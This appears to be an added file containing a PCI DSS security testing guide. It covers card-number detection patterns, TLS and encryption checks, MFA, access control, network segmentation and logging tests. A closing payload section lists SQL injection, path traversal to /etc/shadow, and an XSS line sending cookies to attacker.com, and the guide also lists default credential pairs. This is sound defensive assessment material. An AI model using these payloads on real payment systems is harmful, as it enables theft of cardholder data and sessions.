@@ -1,0 +1,647 @@
+<pci_dss_security_guide>
+<title>PCI DSS SECURITY TESTING</title>
+
+<critical>Payment Card Industry Data Security Standard (PCI DSS) compliance testing is essential for any application that handles credit card data. Testing must cover cardholder data exposure, encryption validation, access controls, and network segmentation to prevent data breaches and ensure compliance.</critical>
+
+<scope>
+- Cardholder data exposure detection
+- Primary Account Number (PAN) protection
+- Card Verification Value (CVV/CVV2) handling
+- Encryption validation (TLS, data-at-rest)
+- Authentication mechanism testing
+- Access control validation
+- Network segmentation verification
+- Logging and monitoring assessment
+- Vulnerability management compliance
+</scope>
+
+<methodology>
+1. Identify cardholder data storage and transmission points.
+2. Test for unencrypted cardholder data exposure.
+3. Validate encryption implementation (TLS 1.2+, strong ciphers).
+4. Test authentication and authorization controls.
+5. Verify network segmentation between CDE and other systems.
+6. Assess logging, monitoring, and audit trail coverage.
+7. Check for compliance with PCI DSS requirements 1-12.
+</methodology>
+
+<cardholder_data_exposure>
+<pan_detection>
+{% raw %}
+# Primary Account Number (PAN) patterns:
+
+# Visa: 4xxx-xxxx-xxxx-xxxx (13-19 digits)
+^4[0-9]{12}(?:[0-9]{3})?(?:[0-9]{3})?$
+
+# Mastercard: 5xxx-xxxx-xxxx-xxxx (16 digits)
+^5[1-5][0-9]{14}$
+
+# American Express: 3xxx-xxxxxx-xxxxx (15 digits)
+^3[47][0-9]{13}$
+
+# Discover: 6xxx-xxxx-xxxx-xxxx (16 digits)
+^6(?:011|5[0-9]{2})[0-9]{12}$
+
+# Test for exposed PANs in:
+# - API responses
+# - URL parameters
+# - Form fields
+# - Log files
+# - Database fields
+# - JavaScript variables
+# - HTML comments
+# - Error messages
+# - Email communications
+
+# Search patterns:
+grep -rE "\b4[0-9]{12}(?:[0-9]{3})?\b" .
+curl https://api.example.com/user/profile | grep -E "\b[0-9]{13,19}\b"
+
+# Check for masked vs full PAN:
+# Compliant: 4111********1111
+# Non-compliant: 4111111111111111
+{% endraw %}
+</pan_detection>
+
+<cvv_exposure>
+{% raw %}
+# Card Verification Value must NEVER be stored
+
+# Test for CVV storage:
+# - POST request bodies after authorization
+# - Database queries
+# - Log files
+# - Session storage
+# - Cookies
+
+# CVV patterns (3-4 digits):
+\b[0-9]{3,4}\b
+
+# Check API responses:
+POST /payment/authorize
+{
+  "card_number": "4111111111111111",
+  "cvv": "123",  # Should not be in response or logs
+  "expiry": "12/25"
+}
+
+# After authorization, CVV must be purged:
+SELECT * FROM transactions WHERE cvv IS NOT NULL  # Should return 0
+
+# Non-compliant responses:
+{
+  "status": "success",
+  "card": {
+    "last4": "1111",
+    "cvv": "123"  # VIOLATION
+  }
+}
+{% endraw %}
+</cvv_exposure>
+
+<sensitive_data_storage>
+{% raw %}
+# PCI DSS Requirement 3: Protect stored cardholder data
+
+# Test for unencrypted storage:
+# 1. Database inspection
+SELECT card_number FROM payments LIMIT 10;
+# If full PAN visible, it's a violation
+
+# 2. File system search
+find / -name "*.log" -exec grep -l "4[0-9]{15}" {} \;
+
+# 3. Backup files
+ls -la /backups/*.sql
+gunzip -c backup.sql.gz | grep "card_number"
+
+# 4. Application logs
+tail -f /var/log/app.log | grep -E "\b[0-9]{13,19}\b"
+
+# Compliant storage methods:
+# - Tokenization (replace PAN with token)
+# - Truncation (store only last 4 digits)
+# - Hashing (one-way, with salt)
+# - Encryption (AES-256, key management)
+
+# Test tokenization:
+POST /tokenize
+{"pan": "4111111111111111"}
+Response: {"token": "tok_1234abcd5678efgh"}
+
+# Verify token cannot be reversed:
+POST /detokenize
+{"token": "tok_1234abcd5678efgh"}
+# Should require strong authentication
+{% endraw %}
+</sensitive_data_storage>
+</cardholder_data_exposure>
+
+<encryption_validation>
+<tls_configuration>
+{% raw %}
+# PCI DSS Requirement 4: Encrypt transmission of cardholder data
+
+# Test TLS version:
+openssl s_client -connect example.com:443 -tls1
+openssl s_client -connect example.com:443 -tls1_1
+# Both should fail (TLS 1.0/1.1 prohibited)
+
+openssl s_client -connect example.com:443 -tls1_2
+openssl s_client -connect example.com:443 -tls1_3
+# Should succeed
+
+# Test cipher suites (PCI DSS compliant):
+nmap --script ssl-enum-ciphers -p 443 example.com
+
+# Non-compliant ciphers:
+# - NULL ciphers
+# - Anonymous DH
+# - Export ciphers
+# - RC4, DES, 3DES
+# - Ciphers < 128 bits
+
+# Strong ciphers required:
+# - AES-GCM (AES_128_GCM_SHA256, AES_256_GCM_SHA384)
+# - ChaCha20-Poly1305
+# - Forward secrecy (ECDHE)
+
+# Test certificate:
+openssl s_client -connect example.com:443 -showcerts
+# Verify:
+# - Valid certificate
+# - Not self-signed
+# - Proper subject alternative names
+# - Not expired
+{% endraw %}
+</tls_configuration>
+
+<data_at_rest_encryption>
+{% raw %}
+# Test for encrypted storage:
+
+# 1. Database encryption
+# Check if Transparent Data Encryption (TDE) is enabled
+SELECT name, is_encrypted FROM sys.databases;
+
+# 2. File system encryption
+# Check for encrypted volumes/partitions
+lsblk -o NAME,TYPE,SIZE,MOUNTPOINT,FSTYPE,ENCRYPTED
+
+# 3. Application-level encryption
+# Verify encrypted fields in database
+SELECT TOP 10 encrypted_card_data FROM payments;
+# Should show encrypted/binary data, not plaintext
+
+# Key management testing:
+# - Keys stored separately from data
+# - Key rotation procedures
+# - Access controls on keys
+# - Hardware Security Module (HSM) usage
+
+# Test key exposure:
+find /var/www -name "*.key"
+grep -r "encryption_key" /var/www/config/
+# Keys should not be in application code
+{% endraw %}
+</data_at_rest_encryption>
+</encryption_validation>
+
+<authentication_testing>
+<multi_factor_authentication>
+{% raw %}
+# PCI DSS Requirement 8: Identify and authenticate access
+
+# Test MFA enforcement for:
+# - Cardholder Data Environment (CDE) access
+# - Administrative accounts
+# - Remote access
+# - Third-party access
+
+# MFA bypass testing:
+POST /login
+{"username": "admin", "password": "password123"}
+# Should require second factor
+
+# Test MFA methods:
+# 1. Time-based One-Time Password (TOTP)
+# 2. SMS/Email codes
+# 3. Hardware tokens
+# 4. Biometrics
+
+# Replay attack testing:
+# Capture valid MFA code
+POST /verify-mfa
+{"code": "123456"}
+# Attempt reuse
+POST /verify-mfa
+{"code": "123456"}  # Should fail
+
+# MFA bypass attempts:
+# - Cookie manipulation
+# - Session fixation
+# - Direct URL access
+# - API endpoint bypass
+{% endraw %}
+</multi_factor_authentication>
+
+<password_policies>
+{% raw %}
+# Test password requirements:
+
+# Minimum complexity:
+# - 7+ characters (12+ for admin)
+# - Alphanumeric + special characters
+# - Not match last 4 passwords
+# - Change every 90 days
+
+# Test weak passwords:
+POST /register
+{"username": "user", "password": "123456"}
+# Should be rejected
+
+POST /register
+{"username": "user", "password": "password"}
+# Should be rejected
+
+# Lockout testing:
+for i in {1..6}; do
+  curl -X POST /login -d '{"username":"admin","password":"wrong"}'
+done
+# Should lock account after 6 attempts
+
+# Password storage testing:
+SELECT username, password FROM users LIMIT 5;
+# Passwords should be hashed (bcrypt, Argon2)
+# Format: $2b$12$... (bcrypt)
+{% endraw %}
+</password_policies>
+
+<session_management>
+{% raw %}
+# Test session security:
+
+# Session timeout:
+# - 15 minutes of inactivity for CDE
+# Set session, wait 16 minutes, attempt access
+# Should require re-authentication
+
+# Session fixation:
+GET /login
+# Note session cookie
+POST /login (with valid credentials)
+# Session ID should change
+
+# Session token entropy:
+# Collect 100+ session tokens
+# Analyze for predictability
+
+# Concurrent session testing:
+# Login from location A
+# Login from location B
+# Session A should be invalidated
+{% endraw %}
+</session_management>
+</authentication_testing>
+
+<access_control_testing>
+<least_privilege>
+{% raw %}
+# PCI DSS Requirement 7: Restrict access to cardholder data
+
+# Test role-based access control:
+
+# User roles:
+# - Customer: Read own data only
+# - Support: Read limited customer data
+# - Admin: Full access to CDE
+# - Developer: No production CDE access
+
+# Horizontal privilege escalation:
+# Login as user1
+GET /api/payments/user1  # Should work
+GET /api/payments/user2  # Should fail
+
+# Vertical privilege escalation:
+# Login as customer
+POST /admin/users/create  # Should fail
+GET /admin/reports  # Should fail
+
+# Test "need-to-know" access:
+# Support users should only see masked PANs
+GET /api/customer/123/payment-methods
+# Response: {"last4": "1111", "brand": "Visa"}
+# NOT: {"card_number": "4111111111111111"}
+
+# Database-level access:
+# Application DB user should have minimal permissions
+SHOW GRANTS FOR 'app_user'@'localhost';
+# Should NOT have DROP, CREATE, ALTER
+{% endraw %}
+</least_privilege>
+
+<default_credentials>
+{% raw %}
+# Test for default accounts:
+
+# Common defaults:
+admin/admin
+admin/password
+root/root
+sa/sa
+administrator/administrator
+
+# Database defaults:
+# MySQL: root/(blank)
+# PostgreSQL: postgres/postgres
+# MongoDB: admin/admin
+# Redis: (no auth)
+
+# Application defaults:
+# Look for hardcoded credentials
+grep -r "password.*=.*admin" /var/www/
+grep -r "default.*password" /var/www/config/
+
+# Test default API keys:
+curl -H "Authorization: Bearer default_key_12345" https://api.example.com/
+{% endraw %}
+</default_credentials>
+</access_control_testing>
+
+<network_segmentation>
+<cde_isolation>
+{% raw %}
+# PCI DSS Requirement 1: Install and maintain firewall
+
+# Test network segmentation:
+
+# CDE should be isolated from:
+# - Corporate network
+# - Guest Wi-Fi
+# - Internet (DMZ)
+# - Non-CDE systems
+
+# Firewall rule testing:
+nmap -p 1-65535 cde-server.internal
+# Only required ports should be open:
+# - 443 (HTTPS)
+# - 22 (SSH, admin only)
+# - Database port (from app servers only)
+
+# Test cross-network access:
+# From corporate network:
+curl http://cde-server.internal:3306
+# Should be blocked
+
+# From DMZ:
+telnet cde-server.internal 1433
+# Should timeout/reject
+
+# Ingress/egress rules:
+# - Block all inbound by default
+# - Allow only necessary outbound
+# - Log denied connections
+
+# Test VLAN segmentation:
+# CDE on separate VLAN
+# No routing between VLANs without firewall
+{% endraw %}
+</cde_isolation>
+
+<wireless_security>
+{% raw %}
+# Test wireless network security:
+
+# WPA2/WPA3 encryption required
+# No WEP or open networks
+
+# Guest network:
+# Completely isolated from CDE
+# No access to internal resources
+
+# Test wireless isolation:
+# Connect to guest Wi-Fi
+ping cde-server.internal  # Should fail
+nmap 10.0.1.0/24  # Internal network, should be blocked
+{% endraw %}
+</wireless_security>
+</network_segmentation>
+
+<logging_monitoring>
+<audit_trail_testing>
+{% raw %}
+# PCI DSS Requirement 10: Track and monitor all access
+
+# Required log events:
+# - All user access to cardholder data
+# - Admin actions
+# - Authentication attempts
+# - Audit log access/modifications
+# - Creation/deletion of accounts
+# - Privilege changes
+
+# Test log completeness:
+# Perform action
+POST /api/payment/process
+# Check logs
+tail -f /var/log/audit.log
+# Should contain:
+# - Timestamp
+# - User ID
+# - Event type
+# - Success/failure
+# - Origination IP
+# - Affected resources
+
+# Log tampering test:
+# Attempt to modify logs
+echo "" > /var/log/audit.log
+# Should be prevented (immutable flag)
+
+# Log retention:
+# Minimum 3 months online
+# Minimum 1 year total
+ls -la /var/log/archive/
+
+# Time synchronization:
+ntpq -p
+# All systems should sync with NTP
+{% endraw %}
+</audit_trail_testing>
+
+<file_integrity_monitoring>
+{% raw %}
+# Test FIM on critical files:
+
+# Files to monitor:
+# - /etc/passwd
+# - /etc/shadow
+# - Web application files
+# - Database configuration
+# - System binaries
+
+# Modify a critical file:
+echo "test" >> /var/www/html/index.php
+# FIM should alert
+
+# Check FIM configuration:
+cat /etc/aide/aide.conf
+aide --check  # Run integrity check
+{% endraw %}
+</file_integrity_monitoring>
+</logging_monitoring>
+
+<vulnerability_management>
+<patch_management>
+{% raw %}
+# PCI DSS Requirement 6: Develop and maintain secure systems
+
+# Test patch levels:
+
+# Operating system:
+apt list --upgradable  # Debian/Ubuntu
+yum updateinfo list security  # RedHat/CentOS
+
+# Critical patches should be applied within 30 days
+# High-risk vulnerabilities should be addressed
+
+# Web server:
+apache2 -v
+nginx -v
+# Check against CVE databases
+
+# Application dependencies:
+npm audit
+pip list --outdated
+composer outdated
+
+# Database:
+mysql --version
+psql --version
+# Check for security updates
+{% endraw %}
+</patch_management>
+
+<vulnerability_scanning>
+{% raw %}
+# Quarterly vulnerability scans required
+
+# Internal scans:
+nmap -sV -p- --script vuln internal-network.local
+
+# External scans:
+nmap -sV -p- --script vuln public-ip.example.com
+
+# Web application scanning:
+nikto -h https://example.com
+sqlmap -u "https://example.com/page?id=1"
+
+# Authenticated scanning:
+# Test with valid credentials
+# Test for privilege escalation
+
+# ASV (Approved Scanning Vendor) scan:
+# Quarterly external scans required
+# Must achieve passing grade
+{% endraw %}
+</vulnerability_scanning>
+
+<secure_coding>
+{% raw %}
+# Test for secure coding practices:
+
+# Input validation:
+POST /api/payment
+{"amount": "-100"}  # Negative amount
+{"amount": "999999999"}  # Excessive amount
+{"card_number": "4111'; DROP TABLE--"}  # SQL injection
+
+# Output encoding:
+GET /search?q=<script>alert(1)</script>
+# Should be encoded in response
+
+# Error handling:
+POST /api/charge
+{"card_number": "invalid"}
+# Error should not reveal system details
+
+# Security headers:
+curl -I https://example.com
+# Should include:
+# Strict-Transport-Security
+# Content-Security-Policy
+# X-Frame-Options
+# X-Content-Type-Options
+{% endraw %}
+</secure_coding>
+</vulnerability_management>
+
+<common_payloads>
+{% raw %}
+# PAN detection:
+4111111111111111
+5500000000000004
+378282246310005
+
+# SQL injection in payment forms:
+' OR '1'='1
+1'; DROP TABLE payments--
+1 UNION SELECT card_number FROM payments--
+
+# XSS in transaction fields:
+<script>new Image().src='http://attacker.com/'+document.cookie</script>
+<img src=x onerror='alert(document.cookie)'>
+
+# Path traversal:
+GET /statements/../../etc/passwd
+GET /receipts/....//....//etc/shadow
+
+# IDOR testing:
+GET /api/transactions/123  # Own transaction
+GET /api/transactions/124  # Other user transaction
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate exposed cardholder data (PAN or CVV).
+2. Show weak encryption or insecure transmission.
+3. Prove access control bypass to view other users' payment data.
+4. Document missing authentication or MFA for CDE access.
+5. Show inadequate logging of cardholder data access.
+6. Provide evidence of network segmentation failures.
+</validation>
+
+<false_positives>
+- Tokenized PANs (not actual card numbers)
+- Test card numbers in non-production environments
+- Masked PANs showing only last 4 digits
+- Properly encrypted cardholder data at rest
+- Strong TLS 1.2/1.3 with approved ciphers
+- Comprehensive audit logging with tamper protection
+</false_positives>
+
+<impact>
+- Massive data breach with exposed cardholder data
+- Loss of PCI DSS compliance and ability to process cards
+- Significant fines from payment brands (Visa, Mastercard)
+- Reputational damage and loss of customer trust
+- Card reissuance costs
+- Legal liability and regulatory penalties
+- Potential business shutdown
+</impact>
+
+<pro_tips>
+1. Focus on cardholder data flows - map storage, transmission, processing.
+2. Test both application and infrastructure layers.
+3. Verify encryption at every stage (transmission, storage, processing).
+4. Check for PAN exposure in logs, error messages, URLs.
+5. Test authentication for all CDE access points.
+6. Validate network segmentation between CDE and other networks.
+7. Review audit logs for completeness and integrity.
+8. Test for CVV storage (absolute prohibition).
+9. Verify security controls match documented policies.
+10. Use Approved Scanning Vendor (ASV) scan results as baseline.
+</pro_tips>
+
+<remember>PCI DSS compliance is about protecting cardholder data throughout its lifecycle. The most critical tests are detecting unencrypted PANs, verifying TLS configuration, testing access controls to payment data, and ensuring comprehensive audit logging. CVV storage is absolutely prohibited - any CVV found post-authorization is a critical violation. Network segmentation between the CDE and other systems is mandatory and must be validated.</remember>
+</pci_dss_security_guide>
